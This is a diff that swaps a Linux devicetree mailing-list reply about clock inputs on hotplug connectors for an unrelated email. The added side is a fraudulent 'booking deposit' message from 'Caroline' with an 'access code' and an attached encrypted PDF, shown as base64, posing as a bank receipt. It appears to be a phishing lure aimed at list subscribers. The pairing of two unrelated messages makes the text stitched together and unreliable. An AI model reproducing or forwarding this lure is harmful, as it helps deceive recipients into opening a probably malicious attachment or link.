@@ -1,164 +1,145 @@
-Received: from smtpout-04.galae.net (smtpout-04.galae.net [185.171.202.116])
-	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
-	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B27F03D76;
-	Fri, 10 Oct 2025 16:32:17 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=185.171.202.116
+Received: from mail.pickup.hu (mail.pickup.hu [89.251.32.12])
+	by smtp.subspace.kernel.org (Postfix) with ESMTP id DBAAC2E92B4
+	for <devicetree-compiler@vger.kernel.org>; Fri, 31 Oct 2025 15:55:54 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=89.251.32.12
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1760113940; cv=none; b=YenM/81l3FnodqsbiU+qo3dvbocs7hcGgIXvDzk3LEfGDJuMG6bSdAbzYvcNpgBVWs9t6Vzeoco/jKGWl4EmlTMYWc/rHeOKuAd72utu6l7iW/i/AAGlqsAzLisBsn+kLpX7NnK0Rhxzafl2bk3NZ82IOuM0l/Obsj+ZUrjbFCE=
+	t=1761926157; cv=none; b=ePwemTNI9GgtP2tc/SKcu2288qk+wd2Rc8g0bbKNp25SDbx7JV4rlQhXx0eltuyk5rTaEzzJRmoTSZqSCJx1a5MCFkkteFZcyZwt3fw6yt0K89PFs94UDs+4FSnbunPk0VGtKmdmcmxeVMq8CNUrSqz+Ji+ZxNyzqoTNuvlME0U=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1760113940; c=relaxed/simple;
-	bh=5kwuV8eNnA83Ato1cZbhy9+x6tIprPRIWS08vVYojKw=;
-	h=Date:From:To:Cc:Subject:Message-ID:In-Reply-To:References:
-	 MIME-Version:Content-Type; b=k8OgAi9bkxDeKoVmhITmZg45x40j8mUvUtt+FgmarKzWE/saB+jXNdc0YlrGY3J5laKy9eSgB/n6wCfY8JpxyMR6Nd5mSjO34Eluf21iOISjGHc/kbokflHEg/DEKlCGyB7fH+KdGxXpc5LGS/96suW5POLrGkH2UUvsMmo1WDg=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=bootlin.com; spf=pass smtp.mailfrom=bootlin.com; dkim=pass (2048-bit key) header.d=bootlin.com header.i=@bootlin.com header.b=kwc9QkyR; arc=none smtp.client-ip=185.171.202.116
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=bootlin.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=bootlin.com
-Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=bootlin.com header.i=@bootlin.com header.b="kwc9QkyR"
-Received: from smtpout-01.galae.net (smtpout-01.galae.net [212.83.139.233])
-	by smtpout-04.galae.net (Postfix) with ESMTPS id A3B29C08CD5;
-	Fri, 10 Oct 2025 16:31:51 +0000 (UTC)
-Received: from mail.galae.net (mail.galae.net [212.83.136.155])
-	by smtpout-01.galae.net (Postfix) with ESMTPS id 374E160667;
-	Fri, 10 Oct 2025 16:32:10 +0000 (UTC)
-Received: from [127.0.0.1] (localhost [127.0.0.1]) by localhost (Mailerdaemon) with ESMTPSA id D7D3D102F21B3;
-	Fri, 10 Oct 2025 18:31:55 +0200 (CEST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=bootlin.com; s=dkim;
-	t=1760113929; h=from:subject:date:message-id:to:cc:mime-version:content-type:
-	 content-transfer-encoding:in-reply-to:references;
-	bh=pBVjYyQaOHn9Ik1fDoHu9eZ8SXCQAudCG8yjKEp/G2Y=;
-	b=kwc9QkyRkyaJaPEi2u4+QXJ4WKJT3ztIEJ6MP8BcqI8b5CXFsY+HtAwBDIHmzPV+GpR2cJ
-	dAPQNauShMHVcfjXIZS3a9NnEFcb/620JNuPeZBoH5hdhecEIfV6V/ylMQvfE1wgE2cmIZ
-	RIHM1/bu9PvBOqdAC25qyRcsUvLfI/7txZf60bODlcFg9vP1hb5/fxpLf0AaNozidbqQjV
-	VZrB/TYaXJf9+yWx7LPQKt5KWVMAeHrypCNVR+3IAgOLrbnPGBk7lxTrTyeI39r2GRKwO6
-	Mh6VuGUxVM/9SOrWPMzhiq9XvQXtFjif8OQjBmgexugctEgkkxAo0vP31HoHpA==
-Date: Fri, 10 Oct 2025 18:31:52 +0200
-From: Herve Codina <herve.codina@bootlin.com>
-To: David Gibson <david@gibson.dropbear.id.au>
-Cc: Geert Uytterhoeven <geert@linux-m68k.org>, Ayush Singh
- <ayush@beagleboard.org>, Krzysztof Kozlowski <krzk@kernel.org>, Rob Herring
- <robh@kernel.org>, Andrew Davis <afd@ti.com>, Wolfram Sang
- <wsa+renesas@sang-engineering.com>, Luca Ceresoli
- <luca.ceresoli@bootlin.com>, devicetree@vger.kernel.org, Jason Kridner
- <jkridner@gmail.com>, Krzysztof Kozlowski <krzk+dt@kernel.org>, Conor
- Dooley <conor+dt@kernel.org>, devicetree-compiler@vger.kernel.org,
- linux-kernel@vger.kernel.org, Thomas Petazzoni
- <thomas.petazzoni@bootlin.com>
-Subject: Re: Device tree representation of (hotplug) connectors: discussion
- at ELCE
-Message-ID: <20251010183152.1530f5ab@bootlin.com>
-In-Reply-To: <aOi8oLGYVckesJSb@zatzit>
-References: <20250918094409.0d5f92ec@bootlin.com>
-	<aMzhgDYOuG4qNcc0@zatzit>
-	<dcbeaff2-0147-4a27-bb46-e247e42810d7@beagleboard.org>
-	<aNJVqSpdAJzGliNx@zatzit>
-	<20250923114849.2385736d@bootlin.com>
-	<CAMuHMdWmDwedyPnBERs-tSYEG15nMUuh9u1Q+W_FdquHpUC0-A@mail.gmail.com>
-	<aNNvaN4xJtKBFmWT@zatzit>
-	<cd9763b7-919a-4b44-a347-f1491d9584b9@beagleboard.org>
-	<aNtXnAeLj3xNwkyE@zatzit>
-	<CAMuHMdV+sUZpMtbCtWqJMiL_JC_nFEJcFDOoZJZPhhzhY8zQJQ@mail.gmail.com>
-	<aOi8oLGYVckesJSb@zatzit>
-Organization: Bootlin
-X-Mailer: Claws Mail 4.3.1 (GTK 3.24.43; x86_64-redhat-linux-gnu)
+	s=arc-20240116; t=1761926157; c=relaxed/simple;
+	bh=tz5WCkRvVcbwyXNIVSo+txmmMcC0aOvTD2br0A4HSQM=;
+	h=Content-Type:MIME-Version:Subject:To:From:Date:Message-Id; b=o/2mWabMdWqSkxADPVhZYjkZ9n3gXh59qC+mzyqlmgETqLvMdzqzng/d4GJyvFd3U4gCrqyFAvZ502S4dSvDxpFKi9XbPTcT57CNUXl5ZZzVaGANWnTRASsaatY+a7RM+1giLJ0ZbC0K4WUeFKvetp7S8OB34541EGz0lnaYe8g=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=pickup.hu; spf=pass smtp.mailfrom=pickup.hu; arc=none smtp.client-ip=89.251.32.12
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=pickup.hu
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=pickup.hu
+Received: from IP-223-57.dataclub.eu (unknown [31.171.239.145])
+	by mail.pickup.hu (pickup.hu 1. eMail Server) with ESMTP id 547DBCFB3BD
+	for <devicetree-compiler@vger.kernel.org>; Fri, 31 Oct 2025 16:24:42 +0100 (CET)
+Content-Type: multipart/mixed; boundary="===============0229810496=="
 Precedence: bulk
 X-Mailing-List: devicetree-compiler@vger.kernel.org
 List-Id: <devicetree-compiler.vger.kernel.org>
 List-Subscribe: <mailto:devicetree-compiler+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:devicetree-compiler+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 8bit
-X-Last-TLS-Session-Version: TLSv1.3
+Subject: Please Confirm booking deposit
+To: devicetree-compiler@vger.kernel.org
+From: "Caroline" <zoliedit@pickup.hu>
+Date: Fri, 31 Oct 2025 17:24:42 +0200
+Message-Id: <20251031152442.547DBCFB3BD@mail.pickup.hu>
 
-On Fri, 10 Oct 2025 18:58:24 +1100
-David Gibson <david@gibson.dropbear.id.au> wrote:
+You will not see this in a MIME-aware mail reader.
+--===============0229810496==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
 
-> On Tue, Sep 30, 2025 at 09:52:44AM +0200, Geert Uytterhoeven wrote:
-> > Hi David,
-> > 
-> > On Tue, 30 Sept 2025 at 06:34, David Gibson <david@gibson.dropbear.id.au> wrote:  
-> > > On Wed, Sep 24, 2025 at 10:33:50PM +0530, Ayush Singh wrote:  
-> > > > On 9/24/25 09:41, David Gibson wrote:  
-> [snip]
-> > > > > > > > a) Addons can only add completely new nodes, never modify existing
-> > > > > > > >     ones.  This means that whatever addons are present at runtime,
-> > > > > > > >     every node has a single well defined owner (either base board or
-> > > > > > > >     addon).  
-> > > > > > > In this rule I suppose that "never modify existing ones" should be understood
-> > > > > > > as "never modify, add or remove properties in existing ones". Because, of course
-> > > > > > > adding a full node in a existing one is allowed (rule b).  
-> > > > > > What if the add-on board contains a provider for the base board.
-> > > > > > E.g. the connector has a clock input, fed by an optional clock generator
-> > > > > > on the add-on board.  Hooking that into the system requires modifying
-> > > > > > a clocks property in the base board, cfr. [1].
-> > > > > > Or is there some other solution?  
-> > > > > Hmm.  My first inclination would be that this case is not in scope for
-> > > > > the protocol we're trying to design now.  If the widget provides
-> > > > > things to the base board as well as the other way around, it's no
-> > > > > longer an "addon" for the purposes of this spec.
-> > > > >
-> > > > > But it's possible I've underestimated how common / useful such a case
-> > > > > is.
-> > > > >
-> > > > > Note that I'd expect the existing overlay mechanism to still be
-> > > > > around.  It may be ugly and not very well thought out, but its
-> > > > > drawbacks are much less severe if you're not dealing with hot unplug.  
-> > > >
-> > > > Well, while that was not an initial use-case in my mind, external clock
-> > > > inputs are a valid use-case when talking about connectors for board headers
-> > > > specifically (e.g. pocketbeagle connector).  
-> > >
-> > > I guess I'm not familiar enough with modern embedded hardware.  I'm
-> > > having a hard time wrapping my head around what's going on here.  If
-> > > the external clock input is optional (hence under a connector), how is
-> > > anything on the base board dependent on it?  If nothing on the base
-> > > board is dependent, why do we need to modify its properties to
-> > > represent it?
-> > >
-> > > Is this a design flaw in the clocks binding?  
-> > 
-> > In my example, the external clock input is indeed optional, and not
-> > used by the base board itself.  Still, it is a clock input to the SoC,
-> > and may be used as a reference clock when an add-on board is connected
-> > that needs to use the exact clock frequency of that reference clock.
-> > 
-> > https://elixir.bootlin.com/linux/v6.17/source/arch/arm64/boot/dts/renesas/white-hawk-ard-audio-da7212.dtso
-> > AUDIO_CLKIN_V is the optional clock input to the SoC.
-> > GP1_25/SL_SW2_V/TPU is the reference clock (actually it is not
-> > generated on the add-on board, but by a PWM controller on the base
-> > board, but it could just be a crystal oscillator on the add-on board
-> > instead)
-> > 
-> > I hope this makes it clearer.  
-> 
-> I think so.
-> 
-> IIUC, the problem is that while both the producer and the consumer of
-> the clock are addons, it's routed through the SoC, which is why it
-> requires some representation there.
-> 
-> What seems like the logical approach to me is for the base board to
-> have essentially an unresolved pointer to the clock input.  I'm not
-> really sure how that could be sensibly encoded, though.
-> 
+Hello Dear,
 
-I don't think that having unresolved symbols in the base DT is the right
-direction. This base DT is used and so all symbols have to be resolved.
-If any symbols are not resolved (either in addon DT or base DT), this DT
-should not be used. For the base DT, "not used" means no boot.
+Please, I am writing to confirm payment for my attached booking.
 
-Do we really want to support DT used in runtime with some "invalid" parts ?
+Bank copy access code: 025
 
-IMHO, if the base DT need a resource wired at the connector and provided by
-the addon, the base DT need to reference the connector. From the base DT
-point of view, the consumed resource is the one provided at the connector.
+Kindly confirm receipt at your earliest convenience.
 
-if a clock is wired at the connector the connector can be seen as a clock
-controller. This clock controller should be a kind of "bridge" between the
-base DT clock consumer and the addon board provider and it should perform
-the link without having any unresolved symbols in the base DT side.
+thank you
 
-Best regards,
-Hervé
+Caroline
+--===============0229810496==
+Content-Type: application/pdf
+MIME-Version: 1.0
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Receipt-QD9CF48F-1.pdf"
+
+JVBERi0xLjcKJYGBgYEKCjEgMCBvYmoKPDwKL1R5cGUgL1BhZ2VzCi9LaWRzIFsgMTMgMCBSIF0K
+L0NvdW50IDEKPj4KZW5kb2JqCgoyIDAgb2JqCjw8Ci9UeXBlIC9DYXRhbG9nCi9QYWdlcyAxIDAg
+Ugo+PgplbmRvYmoKCjQgMCBvYmoKPDwKL0JpdHNQZXJDb21wb25lbnQgOAovQ29sb3JTcGFjZSAv
+RGV2aWNlUkdCCi9IZWlnaHQgMTIwCi9TdWJ0eXBlIC9JbWFnZQovVHlwZSAvWE9iamVjdAovV2lk
+dGggMjI1Ci9GaWx0ZXIgWyAvRmxhdGVEZWNvZGUgL0RDVERlY29kZSBdCi9EZWNvZGVQYXJtcyBb
+IG51bGwgPDwKL1F1YWxpdHkgNjAKPj4gXQovTGVuZ3RoIDE4MDgKPj4Kc3RyZWFtCkYl8RNxejzH
+HFtTo57x9/ZL8q1FEviMX8RGFH6ux6qCos3cE45F/bAZBnqKOIHWhWcSeCTFqstwEtC0s1AyNHIj
+c+J9QDyaJ7/7sPGpWmtfp5WJfhWp283BeZkn7MShOEuW5p0+/Mf05ABWHf9mceIv6rKYo4X8ftRq
+MdPYcSsfPhlKjwspp1bCWN4/dmV2iLnhn44dYMZOVs1iQId2RnUO4ed1u5PxPBxBLpDMtBTLgZkV
+wRSL6H/RfVbVZnS3I/9INGoUeVBydlW8DYpSeRuys9NzO9h2QtpqSANenqobEfHIOz6g3Zcupb+y
+SC5mD7UcR00gdWWWYJP4r0IvKDAdRnNgOHNWdFJGCucoFVoiVL94uzH51KNojRYJynzMEK1TZUur
+EXEsF8q/udCOdk6uOnTj6ybxRK6lhq/gy272UFzzc1Ni0kLQzxZ2jntqs/JSqjtvGr1v6o6Xg6fM
+r9yathJKUmuf8VOAEeVkwM5xyfzYOJ2IBs8wEz89UI61rFoUOMauhffxBkQuzfnupAgu0Zs6/6MZ
+VOd5U72pHfwrGTzf/nk4El6UMfOORt2b5oL3cjZNPYaXxRctGlEPMAU/TLhL3twK41UpDaomq1c7
+C2F0M681Nz0W3dJF7auUU+j1ZxXOLaYTJntnXDZexf8RtSC0fXWg1Fo296EORZATxDG/kmD4Jdpx
+y71935QnAVKIdFCirNThSWLNAtP3jRl2Qtnr4C55TbvWNgmfdvWaHN7LtGfoG4suQhGS77d5Sq4G
+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
+DtEeR7dVNDK67m7g8AkQH8o5R0ntipEviGPqQ4AhDrzd71RswHv/gnwpM70RjZBnlRFmfMy45GHP
+F+DzrVIJ4RO5x/AJzy6eot6T3u7eoEAuvNVpyEpQYle+pK2AzOpfjDAVk2aNU8J+7C/6Byg3f7kP
+Jq4zdPccuKEvCAMdy/NitdpoiMWGXCCCjxr+bcw8cPo+fGulehcQeIpu5F9SwcQ6kxVXuS8R6GCQ
+fxRvLmgLsXmo64uZyFJ0GILpQ4RpTmZkv99fotMI49/5kA8iF2WOKfTyWbZZCiAJSdm21qIAg7CY
+z2dylXL2DaZxR8/f2HFac88AffBLA/sgnr/wwEqY15IUWQ7wcpqQ9BsMy8kdvZ2F81ZS2gpMhsS/
+ouhWW5N6KoZdeVslReg+dWImk5XBXmVsi4BjRf3x9hT6lQewCx8P7ShrjNYIrwm0/u5vEavdTiva
+Zq2+zy8e/QpHIxiG8yRMglg0wIrd3xAeDrycYGTiXTTSXfJCUFBqoC2DfFRR3owBFtF2FQMbuRDx
+rK/+WAkyB4phqGn72lId8Bs+8de9XWxM0KQZ9pS5M3xEC7Hmp16J7AQqinS/n+QMG7a8WoEMM48K
+ZW5kc3RyZWFtCmVuZG9iagoKMTAgMCBvYmoKPDwKL1Jlc291cmNlcyA8PAovWE9iamVjdCA8PAov
+WDAgNCAwIFIKPj4KL0ZvbnQgPDwKL0YxIDUgMCBSCi9GMiA2IDAgUgovRjMgNyAwIFIKPj4KPj4K
+L01lZGlhQm94IFsgMCAwIDYxMiA3OTIgXQovVHJhbnMgPDwKPj4KL1R5cGUgL1BhZ2UKL0NvbnRl
+bnRzIDggMCBSCi9Sb3RhdGUgMAovQW5ub3RzIFsgOSAwIFIgXQo+PgplbmRvYmoKCjEyIDAgb2Jq
+Cjw8Ci9NYXRyaXggWyAxIDAgMCAxIC0xOTguNTQ0IC0zMzguMjg3IF0KL0xlbmd0aCA5NgovRmls
+dGVyIC9GbGF0ZURlY29kZQovQkJveCBbIDE5OC41NDQgMzM4LjI4NyA0MTQuNDQ3IDM4MS4zOTgg
+XQovVHlwZSAvWE9iamVjdAovU3VidHlwZSAvRm9ybQovRm9ybVR5cGUgMQo+PgpzdHJlYW0KBxc9
+VlYJzTgPGqsDL/QlUOo+Aa+7SUWIYnGu0XJoHD0ph2Vx+z9JbNaWC6zeCwemvyHLeconXO0/m3oF
+cWiTEC+u4MZOhY2RUF7DIQF9UIB17LCB3mKIIozxPW3dSvodCmVuZHN0cmVhbQplbmRvYmoKCjEz
+IDAgb2JqCjw8Ci9SZXNvdXJjZXMgPDwKL1hPYmplY3QgPDwKL1gwIDQgMCBSCj4+Ci9Gb250IDw8
+Ci9GMSA1IDAgUgovRjIgNiAwIFIKL0YzIDcgMCBSCj4+Cj4+Ci9NZWRpYUJveCBbIDAgMCA2MTIg
+NzkyIF0KL1RyYW5zIDw8Cj4+Ci9UeXBlIC9QYWdlCi9Db250ZW50cyA4IDAgUgovUm90YXRlIDAK
+L0Fubm90cyBbIDkgMCBSIF0KL1BhcmVudCAxIDAgUgo+PgplbmRvYmoKCjE0IDAgb2JqCjw8Ci9G
+aWx0ZXIgL1N0YW5kYXJkCi9WIDQKL0xlbmd0aCAxMjgKL0NGIDw8Ci9TdGRDRiA8PAovQXV0aEV2
+ZW50IC9Eb2NPcGVuCi9DRk0gL0FFU1YyCi9MZW5ndGggMTYKPj4KPj4KL1N0bUYgL1N0ZENGCi9T
+dHJGIC9TdGRDRgovUiA0Ci9PIDwzZGY4NDYyZWVkNTg5NWUzMmNlM2Y1NTBiZjgzMzhkNzFmZjli
+Y2Q2NDBjNjNlNWZjM2MyZGI2ZTRkNWY1Y2E2PgovVSA8Y2YwYjZkODdlYzcyMGVhNmY2ZWZkNjdh
+NjEzZDgzYjgwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMDAwMD4KL1AgLTM5MDQKPj4KZW5k
+b2JqCgoxNSAwIG9iago8PAovRmlsdGVyIC9GbGF0ZURlY29kZQovVHlwZSAvT2JqU3RtCi9OIDYK
+L0ZpcnN0IDM1Ci9MZW5ndGggNDgwCj4+CnN0cmVhbQr87dMiHoFUewbElwdOZenARKF6931CFX6x
+HGcmZq0lPUwe9bCV2v7+L3DQGS1Q9nK9ZYW0GKb0lGRu6YsRjyV9NLjAfXQEuv3NxmlJIKJwlgyV
+3zUMUhBb1bIFk7VVVXLRIEh0isDG4Xpo6dMPGqyghMFxs+odLMu4sl67G7awrpsiNEb1rC/vGjl4
+PIa7ZuQAN55t92LmLRaAptK5POL5nTUQosvfR2ZSeYelG8A/+svQohbJY4F8BuuVbofvcU5CndtC
+kJvuVTj3nICkW/VX7K9hiBGemUtySMZ4HrfioPzfDKRM0GaIQU0U2ReZWtjnPwBNnp9PT2V9WIkL
+ozighElXNshustBeFkZh+SQ9rGpm3uitx3y3cwwtcCZoruFqxrC2RhURBLWmpVzQmVDwOT844qrX
+HNqw5PJ4Kjbgsy4zq4BCV+8V1LzmNn7i1M5g2YzYaLAVkuQup2ElOrwnheiD7lsMmHwEC3dvE6F5
+FeWz3T/nmT0HV1j5AEzyqrkNnzLhmQFFCLSTQVjsP6EP4JfH8wPKuyeKB2g+O2PbJM6g9/fJY9P6
+ctqiATpKSdiOj+xvpbxBuIFwcqfnOaxUS7utnIhkNcHb7+7TytX4V3OagpoknjqlVSEh9wqISl8K
+ZW5kc3RyZWFtCmVuZG9iagoKMTYgMCBvYmoKPDwKL1NpemUgMTcKL1Jvb3QgMiAwIFIKL0VuY3J5
+cHQgMTQgMCBSCi9JbmZvIDMgMCBSCi9JRCBbIDxhMGYwZTk2OGVlNzczNzZiYTJiYzhiZmIyNTI2
+M2VlND4gPGEwZjBlOTY4ZWU3NzM3NmJhMmJjOGJmYjI1MjYzZWU0PiBdCi9GaWx0ZXIgL0ZsYXRl
+RGVjb2RlCi9UeXBlIC9YUmVmCi9MZW5ndGggNjkKL1cgWyAxIDIgMiBdCi9JbmRleCBbIDAgMTcg
+XQo+PgpzdHJlYW0KeJxjYGD4/5+RQYCBgZHBl4GBiYEfxKqHsBhBBBOIYGbkKISIsTDydEFYrIy8
+IUDFfOVAgt8fSAgAtTEKHWNgAAA59QcUCmVuZHN0cmVhbQplbmRvYmoKCnN0YXJ0eHJlZgo0ODA2
+CiUlRU9G
+--===============0229810496==--
